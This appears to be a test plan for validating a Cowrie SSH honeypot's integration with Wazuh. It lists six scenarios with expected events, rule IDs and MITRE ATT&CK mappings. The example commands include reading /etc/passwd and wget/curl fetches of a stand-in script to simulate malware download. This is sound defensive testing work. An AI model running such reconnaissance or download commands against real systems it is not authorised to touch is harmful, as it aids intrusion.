# Attack Scenarios

## Overview

This document describes the attack scenarios used to validate the integration between Cowrie and Wazuh.

Each scenario includes the attack objective, the expected Cowrie event, the Wazuh detection rule, the MITRE ATT&CK mapping, and the expected alert.

---

# Scenario 1 - New SSH Connection

## Objective

Validate that a new SSH connection is detected by Cowrie and forwarded to Wazuh.

### Procedure

```bash
ssh root@<HONEYPOT_IP> -p 2222
```

### Expected Cowrie Event

```
cowrie.session.connect
```

### Expected Rule

```
100101
```

### Alert Severity

Low (Level 3)

---

# Scenario 2 - Failed SSH Login

## Objective

Generate a failed authentication attempt.

### Procedure

Connect using an invalid username or password.

### Expected Cowrie Event

```
cowrie.login.failed
```

### Expected Rule

```
100104
```

### MITRE ATT&CK

T1110 - Brute Force

---

# Scenario 3 - Successful SSH Login

## Objective

Validate successful authentication detection.

### Procedure

Authenticate using a valid Cowrie credential.

### Expected Cowrie Event

```
cowrie.login.success
```

### Expected Rule

```
100105
```

### MITRE ATT&CK

T1078 - Valid Accounts

---

# Scenario 4 - Command Execution

## Objective

Validate command execution monitoring.

### Example Commands

```bash
whoami
```

```bash
pwd
```

```bash
uname -a
```

```bash
ls
```

```bash
cat /etc/passwd
```

### Expected Cowrie Event

```
cowrie.command.input
```

### Expected Rule

```
100106
```

### MITRE ATT&CK

T1059 - Command and Scripting Interpreter

---

# Scenario 5 - File Download

## Objective

Detect malware or tool download attempts.

### Example Commands

```bash
wget http://example.com/file.sh
```

or

```bash
curl http://example.com/file.sh
```

### Expected Cowrie Event

```
cowrie.session.file_download
```

### Expected Rule

```
100108
```

### MITRE ATT&CK

T1105 - Ingress Tool Transfer

---

# Scenario 6 - File Upload

## Objective

Detect file uploads to the honeypot.

### Procedure

Upload a file using SCP or SFTP.

### Expected Cowrie Event

```
cowrie.session.file_upload
```

### Expected Rule

```
100109
```

### MITRE ATT&CK

T1105 - Ingress Tool Transfer

---

# Validation Checklist

| Scenario | Status |
|-----------|--------|
|SSH Connection|⬜|
|Failed Login|⬜|
|Successful Login|⬜|
|Command Execution|⬜|
|File Download|⬜|
|File Upload|⬜|

---

# Evidence

For each validated scenario, the following evidence should be collected:

- Cowrie JSON event
- Wazuh Rule Tester output
- Wazuh Dashboard alert
- MITRE ATT&CK mapping
- Screenshot
